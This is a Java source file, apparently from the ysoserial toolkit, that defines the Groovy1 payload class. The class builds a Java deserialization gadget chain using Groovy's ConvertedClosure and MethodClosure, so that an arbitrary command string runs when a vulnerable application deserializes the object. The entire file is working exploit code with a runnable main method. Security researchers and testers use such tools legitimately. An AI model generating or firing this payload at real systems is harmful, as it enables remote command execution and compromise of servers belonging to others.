@java.lang.SuppressWarnings({ "rawtypes", "unchecked" })
@ysoserial.payloads.annotation.Dependencies({ "org.codehaus.groovy:groovy:2.3.9" })
public class Groovy1 extends ysoserial.payloads.util.PayloadRunner implements ysoserial.payloads.ObjectPayload<java.lang.reflect.InvocationHandler> {
	public java.lang.reflect.InvocationHandler getObject(final java.lang.String command) throws java.lang.Exception {
		final org.codehaus.groovy.runtime.ConvertedClosure closure = new org.codehaus.groovy.runtime.ConvertedClosure(new org.codehaus.groovy.runtime.MethodClosure(command, "execute"), "entrySet");
		final java.util.Map map = ysoserial.payloads.util.Gadgets.createProxy(closure, java.util.Map.class);
		final java.lang.reflect.InvocationHandler handler = ysoserial.payloads.util.Gadgets.createMemoizedInvocationHandler(map);
		return handler;
	}

	public static void main(final java.lang.String[] args) throws java.lang.Exception {
		ysoserial.payloads.util.PayloadRunner.run(ysoserial.payloads.Groovy1.class, args);
	}
}